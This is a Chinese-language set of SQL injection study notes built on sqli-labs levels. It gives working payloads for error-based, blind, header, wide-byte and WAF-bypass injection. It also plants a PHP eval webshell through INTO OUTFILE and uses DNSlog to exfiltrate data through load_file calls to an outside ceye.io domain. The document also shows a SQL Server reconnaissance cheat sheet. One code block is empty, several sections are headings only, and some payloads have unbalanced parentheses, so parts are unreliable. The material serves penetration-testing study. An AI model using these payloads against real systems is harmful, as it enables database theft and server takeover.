<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220807132338276.png" alt="image-20220807132338276" style="zoom:50%;" />

**（2）floor()报错**

```
uname=-admin') union select count(*),concat_ws('-',(select database()),floor(rand(0)*2)) as zxf from information_schema.columns group by zxf -- &passwd=adsdmin&Submit=Submit
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220807133337503.png" alt="image-20220807133337503" style="zoom:50%;" />

**（3）updatexml()报错**

```
uname=-admin') and 1=updatexml(1,concat(0x7e,(select database())),'1') -- &passwd=adsdmin&Submit=Submit
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220807134605125.png" alt="image-20220807134605125" style="zoom:50%;" />

到此，可以做进一步注入，获取更多信息。



## 3.3 盲注

### 简介

**盲注：**页面没有报错回显，不知道数据库具体返回值的情况下，对数据库中的内容进行猜解，实行sql注入。

#### 盲注的使用条件

1. 页面没有回显位
2. 页面也不会出现报错

`满足这两个条件时可以看看页面有没有真值和假值状态，如果有真值和假值两种状态切换的话，就可以使用布尔盲注。`

### 1.布尔盲注

**布尔盲注**：web页面只返回True真和False假两种类型，然后利用页面返回不同，逐个猜解数据。

**例：靶场less-8**

```sql
#真页面true
?id=1' and 1=1 -- 
#假页面false
?id=1' and 1=2 -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220731003633645.png" alt="image-20220731003633645" style="zoom:50%;" /><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220731003657404.png" alt="image-20220731003657404" style="zoom:50%;" />

**需要了解的关键函数**

`ascii()`：把字符转换成对应的ascii码值，也就是一个数字。`使用ascii()函数对要查询的信息的每一个字符进行猜测，如果猜对了，页面为TRUE，正常显示，如果猜错了，页面就为FALSE，不显示，猜出每一个字符后，将所有字符拼接起来，所得到的字符串就是我们要查询的信息。`

ascii码对照表：http://ascii.wjccx.com/

**例如：使用布尔盲注在靶场less-8中猜测数据库名称的第一个字母**

```sql
#猜错的情况
?id=1' and ascii(substr((select database()),1,1))=100 -- 
#猜对的情况
?id=1' and ascii(substr((select database()),1,1))=115 -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220731011438006.png" alt="image-20220731011438006" style="zoom:50%;" /><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220731011543128.png" alt="image-20220731011543128" style="zoom:50%;" />

`在猜测数据库名称第一个字符的过程中，通过对页面的观察，只有当ascii值为115时，页面才能正常显示。而这一值对应的字母是s，所以由此推测出，该数据库名称的第一个字母是s。按照这个过程，利用二分法，依次推断出每一个字符，最后拼接起来就成为了结果。`

也可以不使用ascii()进行盲注，直接猜测字符：

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220731013201344.png" alt="image-20220731013201344" style="zoom:50%;" />

用Python写一个专门针对布尔盲注的程序，通过循环，一次又一次的猜测，拼凑出最终的查询结果。

```Python

```

#### 布尔盲注步骤：

##### （1）猜解数据库名称长度

```sql
#使用二分法，猜解出数据库的长度
and length(database())>=10 -- 
```

##### （2）猜解当前数据库名称的组成字符

```sql
#使用二分法，猜解出数据库名称单个组成字符的ASCII码值，然后对应到字符上
and ascii(substr(database(),1,1))<=120 -- 
```

##### （3）猜解当前数据库下表的个数

```sql
#使用二分法，猜解出当前数据库下的表的个数
and select count(*) from information_schema.tables where table_schema='数据库名称')<=10 -- 
```

```sql
#使用二分法
and length(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security')))<=30-- 
```

##### （4）猜解每个表的表名

获得表的个数之后，从第一个表开始，先猜解单个表名字符串的长度，再猜解每个表名的每一个组成字符。然后按同样的方法，使用limit语句，依次猜解出每一个表的表名。

```sql
and  length((select table_name from information_schema.tables where table_schema='数据库名' limit 0,1)))<=20 -- 
```

##### （5）猜解数据库下表中有多少个字段

```sql
and  ascii(substr((select table_name from information_schema.tables where table_schema='数据库名' limit 0,1),1,1)<=120) -- 
```

##### （6）判断数据库下表中的第一个字段的长度

```sql
and  length((select column_name from information_schema.columns where table_schema='数据库名称' and table_name='表名' limit 0,1))=2 -- 
```

##### （7）查询数据库下表里面的第一个字段的第一是多少

```sql
and  (ascii(substr((select column_name from information_schema.columns where table_schema='数据库名' and table_name='表名' limit 0,1),1,1)))=105 -- 
```

##### （8）得到字段探测第一条数据

```sql
and (ascii(substr((select 字段名 from 表名 limit 0,1),1,1)))=68 -- 
```

### 2.时间盲注

**时间盲注**：web页面只返回一个正常页面，修改闭合符，页面也没有变化。利用页面响应时间不同，逐个猜解数据。前提是数据库会执行命令代码，只是不反馈页面信息。

```sql
#页面响应有延迟，可以判断出闭合符就是‘
http://192.168.37.148/sql/Less-9/?id=1' and sleep(3) -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220801004247964.png" alt="image-20220801004247964" style="zoom:50%;" />

#### 关键函数

`sleep()`：参数为休眠时长，以秒为单位，可以为小数

`if(condition,true,false)`：condition为条件，true是当条件为真时返回的值，false是当条件为假时返回的值。

#### 时间盲注步骤：

靶场练习：less-9

#### （1）判断是否存在时间盲注的条件

```sql
and sleep(3) -- 
```

#### （2）猜测当前数据库名称的长度

如果正确那么就延迟3秒，如果不正确就立即返回

```sql
and if((length(database()))>5,sleep(3),sleep(0)) -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220801005538015.png" alt="image-20220801005538015" style="zoom:50%;" />

#### （3）逐个猜解当前数据库名称的每一个字符

```sql
and if((substr(database(),1,1)='s'),sleep(3),1) -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220801005713489.png" alt="image-20220801005713489" style="zoom:50%;" />

或者，通过ascii码，逐个猜解当前数据库名称的每一个字符

```sql
and if((ascii(substr(database(),1,1))<=120),sleep(3),1) -- 
```

#### （4）猜解当前数据库下表的数量

```sql
and if((select count(*) from information_schema.tables where table_schema='security')<5,sleep(3),1) -- 
```

#### （6）猜解每个表名的长度

使用limit语句

```sql
and if((select length((select table_name from information_schema.tables where table_schema='数据库名' limit 3,1))<=10),sleep(3),1) -- 
```

#### （7）猜解每个表的每个字符

```sql
and if((select ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)))<=120,sleep(3),1) -- 
```

#### （8）猜解users表的字段数量

```sql
and if(((select count(*) from information_schema.columns where table_schema='security' and table_name='users')<=10),sleep(3),1) -- 
```

#### （9）猜解每个列名的长度

```sql
and if((select length((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1))<=10),sleep(3),1) -- 
```

#### （10）逐个猜解每一个列名的每一个字符

```sql
and if((select ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1)))<=120,sleep(3),1) -- 
```

#### （11）猜解username和password组合成的每一条数据的长度

```sql
and if((select length((select group_concat(username,password) from users  limit 0,1)))<=20,sleep(3),1) -- 
```

#### （12）猜解username和password组合成的每一条数据

```sql
and if((select ascii(substr((select group_concat(username,password) from 表名  limit 0,1),1,1)))=49,sleep(3),1) -- 
```

### 3.POST盲注

#### 靶场练习（less-15）

**1.先随便提交一次请求，然后查看抓到的包，获取发送参数**

```
uname=sgdfghg&passwd=aesdgfsrdfg&submit=Submit
```

**2.使用万能秘钥判断用户名处是否存在注入点。**

显示成功登录，说明存在注入点

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220808120953274.png" alt="image-20220808120953274" style="zoom:50%;" />

**2.尝试布尔盲注**

```
uname=admin' and  ascii(substr(database(),1,1))=115 -- &passwd=dsygiudsh&Submit=Submit
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220808122210158.png" alt="image-20220808122210158" style="zoom:50%;" />

**3.尝试时间盲注**

```
uname=admin' and  if(ascii(substr(database(),1,1))=115,sleep(3),sleep(0)) -- &passwd=dsygiudsh&Submit=Submit
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220808122607167.png" alt="image-20220808122607167" style="zoom:50%;" />

## 3.4 文件上传拿webshell

### 1.注入条件

1. 当前sql注入用户必须为DBA权限（--is-dba为true）
2. 需要知道网站的绝对路径
3. My.ini文件中的这项配置`secure_file_priv=””`为空

### 2.mysql文件上传要点

1.`show variables like '%secure%'`：用来查看mysql是否有读写文件权限

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220801105428527.png" alt="image-20220801105428527" style="zoom:50%;" />

其中，出现了，多个variable，需要关注的是`secure_file_priv`。它一般有以下三种值：

- 出现为`空值`''，说明当前用户可以对任何路径下的文件进行读和写操作
- 值为`指定了特定的路径`，那么就只能对该路径下的文件进行读和写操作
- 值为`null`，那么当前用户是不能在目标服务器上进行任何读和写操作的

2.数据库的file权限规定了数据库用户是否有权限，向操作系统内写入和读取已存在的权限。 

3.into outfile命令使用的环境：必须知道一个服务器上可以写入文件的文件夹的完整路径。 

### 3.靶场训练（less-7）

**1.判断是字符型还是数字型。结果为字符型**

**2.判断闭合符和注释符。**

```sql
#语句为真，页面正常显示
?id=1')) and 1=1 -- 
#语句为假，页面报错
?id=1')) and 1=2 -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220801163743872.png" alt="image-20220801163743872" style="zoom:50%;" /><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220801163833180.png" alt="image-20220801163833180" style="zoom:50%;" />

最后，判断出闭合符为`'))`，注释符为`--`

**3.二分法判断列数**

最终，判断出列数为3

```sql
http://192.168.37.148/sql/Less-7/?id=1')) group by 3-- 
```

**4.尝试union注入**

发现没有回显位，无法使用union注入

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220801164447338.png" alt="image-20220801164447338" style="zoom:50%;" />

**5.尝试报错注入**

页面会有报错信息，但是报错信息里也没有回显位

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220801164610340.png" alt="image-20220801164610340" style="zoom:50%;" />

**6.尝试布尔盲注**

可以使用，但是太麻烦太慢，可以尝试文件上传

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220801164925360.png" alt="image-20220801164925360" style="zoom:50%;" />

**7.尝试文件上传**

```php
#文件上传指令,以下代码为一句话木马
<?php @eval($_POST['password']);?>
#password为预留密码
```

```sql
http://192.168.1.18/sql/Less-7/?id=-1')) union select 1,2,"<?php @eval($_POST['zxf123456']);?>" into outfile "D:\\phpstudy_pro\\WWW\\zxf.php" -- 
#虽然结果还是报错但是不影响文件的上传
```

上传前和上传后

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220806120031785.png" alt="image-20220806120031785" style="zoom:50%;" /><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220806120107359.png" alt="image-20220806120107359" style="zoom:50%;" />

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220806120141402.png" alt="image-20220806120141402" style="zoom:50%;" />

**8.可以使用蚁剑或者中国菜刀直接进行远程登录控制**

- 空白处右键点击添加数据

- URL地址一栏填入靶机服务器IP地址和我们刚刚上传的文件的文件名构成的地址

  `http://192.168.1.18/zxf.php`

- 连接密码一栏填入我们在上传文件里设置的密码：`zxf123456`

  <img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220806120633772.png" alt="image-20220806120633772" style="zoom:50%;" />

- 点击测试连接，即可获得webshell。至此，该服务器已经被远程控制了。

  <img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220806120821375.png" alt="image-20220806120821375" style="zoom:50%;" />

  <img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220806120846863.png" alt="image-20220806120846863" style="zoom:50%;" />

## 3.7 dnslog注入

### 1.简介

**dnslog注入**：也算是盲注中的一种，但是效率更高。

#### 关键函数

`load_file()`：可以读取服务器上的固定路径下的文件的内容。

#### UNC路径

**UNC** (Universal Naming Convention，通用命名规则），也叫通用命名规范、通用命名约定，为网络（主要指局域网）上资源的完整 Windows 2000 名称。UNC路径就是类似\\softer这样的形式的网络路径。UNC为网络（主要指局域网）上资源的完整 Windows 2000 名称。

**格式**： \\servername\sharename ，其中 servername 是服务器名，sharename 是共享资源的名称。
目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\\servername\sharename\directory\filename。

**unc共享就是指网络硬盘的共享**。当访问softer计算机中名为it168的共享文件夹，用UNC表示就是\\softer\it168；如果是softer计算机的默认管理共享C$则用\\softer\c$来表示。我们访问网上邻居所采用的命令行访问法，实际上应该称作**UNC路径访问法**。

### 2.条件

- mysql.ini中secure_file_priv必须为空
- secure_file_priv 为null 不允许导入导出
- secure_file_priv 为/tmp 导入导出只能在/tmp目录下
- secure_file_priv 为空时 则不做限制允许导入导出

### 3.详解

以load_file("//(select database()).ynu.edu.cn/sharename")为例，原理过程如下：

1. 攻击者实行`load_file("//(select database()).我的域名/sharename")`注入
2. web服务器接收后转交到数据库执行查询
3. 数据库查询到结果后，将查询结果和后边的域名进行拼接
4. 发送报文到本地dns对该拼接好的url进行域名解析
5. 我们只要获得DNS的日志记录，就可以看到Web服务器数据库查询的结果了。

`但前提是我们要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上获取NDS日志即可。可以使用以下网站辅助进行dnslog注入`

**需要使用的网站**

```http
#使用其中一个就行
http://ceye.io
http://www.dnslog.cn/
```

### 4.靶场实战（less-9）

1.判断闭合符和类型。

执行以下代码，发现，三秒钟后才刷新页面，证明判断正确。属于字符型，闭合符是`'`。

```sql
http://192.168.37.148/sql/Less-9/?id=1' and sleep(3) -- 
```

2.登录http://ceye.io，获得一个域名，实行dnslog注入，并在网站上查看dns查询日志

```sql
http://192.168.43.26/sql/Less-9/?id=1' and (select load_file(concat("//",(select database()),".7wusc8.ceye.io/123"))) -- 
```

执行命令前

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220806002127372.png" alt="image-20220806002127372" style="zoom: 33%;" />

执行命令后

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220806002236891.png" alt="image-20220806002236891" style="zoom:33%;" />

### 5.dnslog自动化注入

1.在github上下载DnslogSqlinj到电脑上，然后解压。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220806124237211.png" alt="image-20220806124237211" style="zoom:50%;" />

2.配置一下config.py这个文件。

把如下变量配置为自己设置的dnslog信息。配置完之后进行dnslog自动化注入了。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220806125442446.png" alt="image-20220806125442446" style="zoom:50%;" /><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220806180049527.png" alt="image-20220806180049527" style="zoom:67%;" />

3.执行代码，实现dnslog自动化注入

因为DnslogSqlinj项目的代码使用Python2写的，所以只能在Python2的环境下执行。

在命令行中，先切换到DnslogSqlinj项目目录下，然后执行以下命令

```powershell
#解析出所有的数据库名
python dnslogSql.py -u "http:192.168.1.18/sql/less-9/index.php?id=1' and ({}) -- " --dbs
```

### 6.POST提交dnslog盲注

#### 靶场练习（less-15）

```
uname=admin' and  (select load_file(concat('//',(select database()),'.7wusc8.ceye.io/123'))) -- &passwd=dsygiudsh&Submit=Submit
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220808124255595.png" alt="image-20220808124255595" style="zoom:50%;" />

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220808124317260.png" alt="image-20220808124317260" style="zoom:50%;" />

## 3.4 POST报头注入

当页面看不到明显变化，万能秘钥无法绕过验证，也找不到其他注入点时，可以尝试报头注入。

### 3.4.1 报头注入之UA注入

#### 代码审计（less-18）

使用phpstorm打开源代码。

```php
$uname = check_input($_POST['uname']);
$passwd = check_input($_POST['passwd']);
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220808132459929.png" alt="image-20220808132459929" style="zoom:33%;" />

其中，check_input对输入的用户名和密码进行检测，以字符的形式进入数据库，而不是以命令的形式进行查询，导致我们无法进行注入。

```php
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
```

对提交的用户名和密码进行对比查询，看是否一致。

注入点就在这里，程序没有对写入的uagent值进行字符检查和安全检测，导致存在了注入点

```php
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
```

#### 开始注入

使用burpsuite来构造ua，然后发送给服务器（使用了重复器，可重复构造并发送报文）

- 开启代理功能
- 用代理来拦截数据包
- 把数据包发送给repeater
- 通过更改User_Agent信息重复提交POST报文，获取反馈信息

![image-20220817182436047](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220817182436047.png)

从截屏里可以看出，报错信息里已经包含了我们所要查询的信息。

### 3.4.2 报头注入之referer注入

#### 代码审计（less-19）

```php
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";

$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
```

可以从referer进行注入

#### 开始注入

```sql
' or extractvalue(1,concat(0x7e,(select database()))),2) #
```

![image-20220818105826699](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220818105826699.png)

可以看到，我们需要查询的信息已经出现在报错信息了，接下来可以进行下一步注入。

### 3.4.3 报头注入之cookie注入

#### 代码审计（less-20）

```php
$result1 = mysql_query($sql);
$row1 = mysql_fetch_array($result1);
$cookee = $row1['username'];

setcookie('uname', $cookee, time()+3600);//生成cookie
```

从以上代码，可以看出服务器端生成用户cookie的方法

#### 开始注入

先登录一次，然后就会有自己的一个cookie产生，之后的登录过程中可以通过cookie进行注入。

使用union注入（用order by来判断列数，不能用group by，因为group by会出现问题）

列数为3.然后开始查询回显位，可以看到如下回显位

![image-20220818120400896](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220818120400896.png)

接着开始下一步注入。

## 3.5 sql注入过滤绕过方式

在判断页面过滤对象时，按顺序一条一条的使用注入语句，逐个测试。

### 3.5.1 注释符绕过

#### 代码审计（less-23）

无论我们使用什么注释符和闭合符来进行注入，都会出现报错，原因就在于以下源代码把敏感字或语句过滤了。

```php
//将id中输入的注释符替换成了null
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
```

#### 绕过方法

方法1.手动再多加一个闭合符,这样就可以在不使用注释符的情况下闭合多余的闭合符(linux可以，windows不行)

例：`?id=1' and 1=1'`

```php
$sql="SELECT * FROM users WHERE id='1' and 1=1'' LIMIT 0,1";
```

方法2.使用and或者or（windows可以）

例：`?id=1' order by 4 or '1'='1`

```php
$sql="SELECT * FROM users WHERE id='1' order by 4 or '1'='1' LIMIT 0,1";
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220818125856993.png" alt="image-20220818125856993" style="zoom:50%;" />

`但是，使用这种方法之后，order by和group by会失效而使用其他语句不会失效，所以要想使用这种方法进行绕过，必须先知道列数。`

### 3.5.2 and和or过滤绕过

#### 绕过方法

**以源代码中会取出提交id里的and为例**

1.使用大小写绕过

例：`?id=1' anD 1=1 #`

2.复写过滤字符

例：`?id=1' anandd 1=1 #`

3.用&&取代and，用||取代or

`一般使用url编码，不然服务器可能识别不到。&的编码是%26`

例：`?id=1' && 1=1 #`

#### less-25

复写可以进行绕过

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220818135119819.png" alt="image-20220818135119819" style="zoom:50%;" />

### 3.5.3 空格过滤绕过

#### 绕过方法(靶场为less-26)

1.使用+代替空格

2.使用url编码代替空格

| 适用范围              | url编码 |
| --------------------- | ------- |
| 空格                  | %20     |
| TAB 09 horizontal TAB | %09     |
| LF OA newline         | %0A     |
| FF 0C new page        | %0C     |
| CR 0D carriage return | %0D     |
| VT 0B vertical TAB    | %0B     |
| OA（仅适用于MYSQL）   | %A0     |

3.使用报错注入

```sql
?id=1'||extractvalue(1,concat(0x7e,(select database())))||'1'='1
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220818141140253.png" alt="image-20220818141140253" style="zoom:50%;" />

下一步注入（有空格的地方全部变为()）

```sql
select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220818141911347.png" alt="image-20220818141911347" style="zoom:50%;" />

limit()的替代函数：mid()，substring(),sub()。三个函数的用法完全一样。

### 3.5.4 逗号过滤绕过

使用join代替逗号的作用进行绕过

#### 绕过方法（less-25a）

```sql
union select * from (select 1)a join (select 2)b join (select database())c -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220818150512839.png" alt="image-20220818150512839" style="zoom:50%;" />

### 3.5.5 union和select绕过

#### 绕过方法（less-27）

1.大小写绕过

2.复写单词绕过

3.报错注入

```sql
?id=0'||updatexml(1,concat(0x7e,(database())),3)or'1'='1
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220819115214116.png" alt="image-20220819115214116" style="zoom:50%;" />

4.url编码绕过（less-28）

[使用url编码代替空格](#3.5.3 空格过滤绕过)

## 3.6 宽字节注入

### 3.6.1 原理

当传递一个参数id=1‘得时候，当我们输入这个单引号，会被认为是非法字符，会被过滤函数添加“\”给过滤掉，所以我们想要程序接受我们传递得参数中包含单引号，那么就需要把这个转义字符“\”干掉，那如何才能干掉呢？当http协议传输得时候，是要经过url编码的，如果这个编码完成后，传递到服务器时，我们可以在单引号前加上一个%81这样得编码，最后这样解码得时候，这个%81就会和“/”对应得编码相结合按照gbk编码要求去解码，最后只剩下个单引号。

### 3.6.2 条件

条件一：靶机数据库的编码方式为GBK编码，并且发请求时声明客户端用的也是GBK编码

条件二：使用了addslashes()，mysql_real_escape_string(),mysql_escape_string()之类的函数

1.`addslashes()`：在预定义字符前添加反斜杠对其字符进行转义，转义之后，该闭合符就失去了原有的闭合功能，导致注入失效。这些字符是单引号（'），双引号（"），反斜线（\）与NUL（NULL）

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220819121447823.png" alt="image-20220819121447823" style="zoom:50%;" />

### 3.6.3 靶场练习（less-32）

输入%df'，本来会转义单引号为`\'`,但\（%5c）编码位为92，%df的编码位为223，拼接后，%df%5c仍然符合GBK取值范围（第一个字节129-254，第二个字节64-254），会解析成一个汉字，这样\就会失去原有的转义作用。

```sql
?id=-1%df' union select 1,2,3 -- 
```

## 3.7 堆叠注入

`原理`：mysql_multi_query() 支持多条sql语句同时执行，就是个;分隔，成堆的执行sql语句

**例如**

`select * from users;show databases;
`

就同时执行以上两条命令，所以我们可以增删改查，只要权限够。
虽然这个注入姿势很牛，但实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。

## 3.8 二次注入

二次注入可以概括为以下两步:

（1）插入恶意数据
进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。

（2）引用恶意数据
开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。

## 3.9 waf（防火墙）绕过方法

探测防火墙时，如果一次输入全部命令，就无法判断防火墙针对哪些命令进行拦截。因此，可以逐个输入命令，看输到哪个命令时，被防火墙拦截。

### 3.9.1 注释符

#，\--+，/\*xxx\*/，/\*!xxx\*/，

`/*!50000xxx*/`:表示数据库的版本在5.000之上的才会执行这个歌代码，否则就不会执行。在注入的时候，如果防火墙对某个字符串进行拦截，可以尝试输入这个注释符进行混淆。

`在/**/之间先加一个！表示，虽然是注释符，但是里面的代码仍然要执行`

### 3.9.2 空白符

1.%09是一个水平制表

2.%0a相当于换行

3.%0C新一页

4.%0B纵向的TabLayout

5.%20是一个空格

6.%a0仅仅只有mysql可以识别空格

7./**/注释空格

8.\--\+x%0a：-\-\+是注释，%0a是换行，这种连接方式被过滤了，因此中间加几个没有用的字符

9.\--\+x%0F%0A：字符在被过滤掉后可以在此尝试url编码其他符号

### 3.9.3 特殊符号

### 3.9.4 编码

### 3.9.5 替换

**1.and和or替换**

- 1.&&和||

- 2.使用异或截断

  - ?id=1^1^0
  - ?id=1^0^0

  3.使用{``operation}

  - and{\`test` 1=2}
  - and{\`test` 1=1}

  4.直接使用真，假

  - && true
  - && false

**2.order by替换group by**

**3.union select 变成 union all select**

**4.information_schema.tables**

- sys.schema_table_statistics_with_buffer
- sys.x$ps_schema_table_statistics_io

**5.information_schema.columns 变成用join法获取列名（前提是页面要有报错回显）**

- 第一列列名：`union/*!70000 xxx*/select * from (select */*!70000 xxx*/from /*!70000 xxx*/users as a join users as b)as c`
- 第二列列名：`union/*!70000 xxx*/select * from (select */*!70000 xxx*/from /*!70000 xxx*/users as a join users as b using(id))as c`
- 第三列列名：`union/*!70000 xxx*/select * from (select */*!70000 xxx*/from /*!70000 xxx*/users as a join users as b using(id,username))as c`

**6.group_concat()**

**7.过滤=或者起到比较作用的东西**

**8.过滤ascii() 换成hex(),bin(),ord()**

**9.过滤substr(),mid()等   换成 left(),right(),mid(),substr(),substring(),lpad(),rpad()**

**10.过滤字段名（通杀全表）**

**11.过滤逗号**

**12.过滤逗号和for**

**13.union楷体正则过滤/^union\[^a-zA-Z0-9_]/i**

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220819170918031.png" alt="image-20220819170918031" style="zoom:50%;" />

### 3.9.6 超大数据包绕过



### 3.9.7 分块传输绕过



# 4.权限提升

#### UDF提权

UDF（User Defined Function，用户自定义函数）是 MySQL 提供的一个功能，可以通过编写 DLL 扩展为MySQL 添加新函数，扩充其功能。

当获得 MySQL 权限之后，即可通过这种方式上传自定义的扩展文件，从 MySQL 中执行系统命令。

# 5.数据库检测

#### MySQL

- sleep sleep(1)

- benchmark BENCHMARK(5000000, MD5(\'test\'))

- ##### 字符串连接

  -   SELECT \'a\' \'b\'

  -   SELECT CONCAT(\'some\',\'string\')

- ##### version

  -   SELECT @@version

  -   SELECT version()

- ##### 识别用函数

  -   connection_id()

  -   last_insert_id()

  -   row_count()

#### Oracle

- ##### 字符串连接

  - ##### 'a\'\|\|\'oracle\' \--

  - ##### SELECT CONCAT(\'some\',\'string\')

- ##### version

  -   SELECT banner FROM v\$version

  -   SELECT banner FROM v\$version WHERE rownum=1

#### SQLServer

- WAITFOR WAITFOR DELAY \'00:00:10\';

- SERVERNAME SELECT @@SERVERNAME

- version SELECT @@version

- ##### 字符串连接

  -   SELECT \'some\'+\'string\'

- ##### 常量

  -   @@pack_received

  -   @@rowcount

#### PostgreSQL

-   sleep pg_sleep(1)

# 6.绕过技巧

- ##### 编码绕过

  -   大小写

  -   url编码

  -   html编码

  -   十六进制编码

- ##### 注释

  - unicode编码
  - // \-- \-- + \-- - \# /\*\*/ ;%00
  - 内联注释用的更多，它有一个特性 /!\*\*/ 只有 MySQL 能识别
  - e.g. index.php?id=-1 /\*!UNION\*/ /\*!SELECT\*/ 1,2,3

- ##### 只过滤了一次时

  -   union=\> ununionion

- ##### 相同功能替换

  - ##### 函数替换

    -   substring / mid / sub

    -   ascii / hex / bin

    -   benchmark / sleep

  - ##### 变量替换

    -   user() / @@user

  - ##### 符号和关键字

    -   and / &

    -   or / \|

- ##### HTTP参数

  - ##### HTTP数污染

    -   id=1&id=2&id=3 根据容器不同会有不同的结果

  - HTTP分割注入

- ##### 缓冲区溢出

  -   一些 C 语言的 WAF 处理的字符串长度有限，超出某个长度后的 payload 可能不会被处理

- ##### 二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过

# 7.SQL注入小技巧

#### 宽字节注入

- 一般程序员用 gbk 编码做开发的时候，会用 set names \'gbk\' 来设定，这句话等同于

```sql
set
character_set_connection = 'gbk',
character_set_result = 'gbk',
character_set_client = 'gbk';
```

- 漏洞发生的原因是执行了 set character_set_client = \'gbk\'; 之后，mysql 就会认为客户端传过来的数据是 gbk 编码的，从而使用 gbk 去解码，而 mysql_real_escape 是在解码前执行的。但是直接用 set names \'gbk\' 的话 real_escape 是不知道设置的数据的编码的，就会加 %5c 。此时 server 拿到数据解码就认为提交的字符 +%5c 是 gbk 的一个字符，这样就产生漏洞了。

- 解决的办法有三种，第一种是把 client 的 charset 设置为 binary，就不会做一次解码的操作。第二种是是 mysql_set_charset(\'gbk\') ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。第三种就是用 pdo。

- 还有一些其他的编码技巧，比如 latin 会弃掉无效的 unicode，那么 admin%32 在代码里面不等于 admin，在数据库比较会等于 admin。

# 8.CheatSheet

#### SQL Server Payload

##### 常见Payload

- ##### Version

  -   SELECT @@version

  -   SELECT SERVERPROPERTY(\'Edition\');

  -   SELECT SERVERPROPERTY(\'EngineEdition\');

- ##### Comment

  -   SELECT 1 \-- comment

  -   SELECT /\*comment\*/1

- ##### Space

  - ##### 0x01 - 0x20

- ##### 用户信息

  -   SELECT user_name()

  -   SELECT system_user

  -   SELECT user

  -   SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID

- ##### 用户权限

  -   select IS_SRVROLEMEMBER(\'sysadmin\')

  -   select IS_SRVROLEMEMBER(\'db_owner\')

- ##### List User

  -   SELECT name FROM master..syslogins

- ##### 数据库信息

  -   SELECT name FROM master..sysdatabases

